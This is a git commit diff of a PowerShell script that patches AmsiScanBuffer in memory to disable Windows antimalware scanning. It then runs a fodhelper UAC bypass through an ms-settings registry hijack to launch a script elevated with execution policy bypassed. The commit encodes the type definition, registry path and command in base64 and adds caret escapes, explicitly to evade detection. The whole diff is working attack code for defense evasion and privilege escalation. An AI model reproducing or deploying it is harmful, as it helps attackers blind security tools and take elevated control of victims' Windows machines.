284b1c20a8b1b9fac07fe8b04c98bf582a1cea65
Eibon <102199146+Eib0nn@users.noreply.github.com>
2025-03-26 22:33:35 -0300

    ALMOST WORKING, PATCH FULLY OBFUSCATED

--- bpsadm.ps1
+++ bpsadm.ps1
@@ -1,23 +1,7 @@
-#   need to change the add-type to reflective loading, this shit fucking triggers every single parser of microsoft, also need to remove comments to work properly
-#   this shitty parser trigger comments ???
-$3beba0bb61934429a13c7e299c4610be = @"
-using System;
-using System.Runtime.InteropServices;
+$3beba0bb61934429a13c7e299c4610be = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgc3RhdGljIGNsYXNzIEtlcm5lbDMyIHsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgbHBQcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBpbnQgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOwp9"
+$29a13c7e299c4610beba2bc292e7b0b2 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($3beba0bb61934429a13c7e299c4610be))
+Add-Type -TypeDefinition $29a13c7e299c4610beba2bc292e7b0b2 -PassThru | Out-Null
 
-public static class Kernel32 {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-Add-Type -TypeDefinition $3beba0bb61934429a13c7e299c4610be -PassThru | Out-Null
-
-# gunction to get the function pointer of a function in a DLL
 function Get-ProcAddress {
     param ([String]$Module, [String]$Function)
 
@@ -36,21 +20,18 @@ function Get-ProcAddress {
     return $0f5f575099964dc8a939812fd6298aea
 }
 
-# get the address of AmsiScanBuffer
 $ee53604107594f2f8b46fb97298ab5a9 = Get-ProcAddress -Module "amsi.dll" -Function "AmsiScanBuffer"
 if ($ee53604107594f2f8b46fb97298ab5a9 -eq [IntPtr]::Zero) {
     Write-Host "[!] Failed to get AmsiScanBuffer address."
     exit
 }
 
-# get VirtualProtect function pointer
 $75277193ae5240b082f3c6d225586ff8 = Get-ProcAddress -Module "kernel32.dll" -Function "VirtualProtect"
 if ($75277193ae5240b082f3c6d225586ff8 -eq [IntPtr]::Zero) {
     Write-Host "[!] Failed to get VirtualProtect address."
     exit
 }
 
-# change memory protection to RWX (0x40 = PAGE_EXECUTE_READWRITE)
 $4a9de04ab6164ad88791923a75380b53 = 0
 $4725cc18365546659b0e76b2820edf6d = [Kernel32]::VirtualProtect($ee53604107594f2f8b46fb97298ab5a9, 6, 0x40, [ref]$4a9de04ab6164ad88791923a75380b53)
 if (-not $4725cc18365546659b0e76b2820edf6d) {
@@ -58,21 +39,23 @@ if (-not $4725cc18365546659b0e76b2820edf6d) {
     exit
 }
 
-# patch AMSI: Write "xor eax, eax; ret"
 $c43e822f834146669c71d1ec0bd0a8f9 = [Byte[]](0x31, 0xC0, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($c43e822f834146669c71d1ec0bd0a8f9, 0, $ee53604107594f2f8b46fb97298ab5a9, $c43e822f834146669c71d1ec0bd0a8f9.Length)
 
-Write-Host "[+] AMSI Patched Successfully"
+Write-Host "[+] Patched Successfully"
 
-# fodhelper via regedigt
-$c10ea18da43749a6847617b29862e38d = "HKCU:\Software\Classes\ms-settings\shell\open\command"
-$459b05be8e2b43819fce3d3683c9bc53 = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1"
+$shitty = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xzaGVsbFxvcGVuXGNvbW1hbmQ="
+$shitty2 = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($shitty))
+$c10ea18da43749a6847617b29862e38d = $shitty2
+
+$90ijd12099hwdh01dhw0dw100jhi1dw0 = "Y21kIC9jIHN0YXJ0IC9taW4gcG93ZXJzaGVsbCAtZXAgYl5eeV5eXnBhXnNzIC1mXmlebF5lIEM6XFVzZXJzXHRoaWVycnlcRGVza3RvcFxwc2VoandhZFx0ZXN0X2VsZXZhdGlvbi5wczE="
+$u9d120i1i0sdojnka090182389jkdjkk = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($90ijd12099hwdh01dhw0dw100jhi1dw0))
+$459b05be8e2b43819fce3d3683c9bc53 = $u9d120i1i0sdojnka090182389jkdjkk
 
 New-Item $c10ea18da43749a6847617b29862e38d -Force | Out-Null
 Set-ItemProperty $c10ea18da43749a6847617b29862e38d -Name "DelegateExecute" -Value ""
 Set-ItemProperty $c10ea18da43749a6847617b29862e38d -Name "(Default)" -Value $459b05be8e2b43819fce3d3683c9bc53
-
-Start-Process "cmd.exe" -ArgumentList "/c start fodhelper.exe" -WindowStyle Hidden
+Start-Process "cmd.exe" -ArgumentList "/c s^t^^a^r^t f^o^d^h^e^l^p^e^r.exe" -WindowStyle Hidden
 
 Start-Sleep 3
 Remove-Item $c10ea18da43749a6847617b29862e38d -Force -Recurse -ErrorAction SilentlyContinue
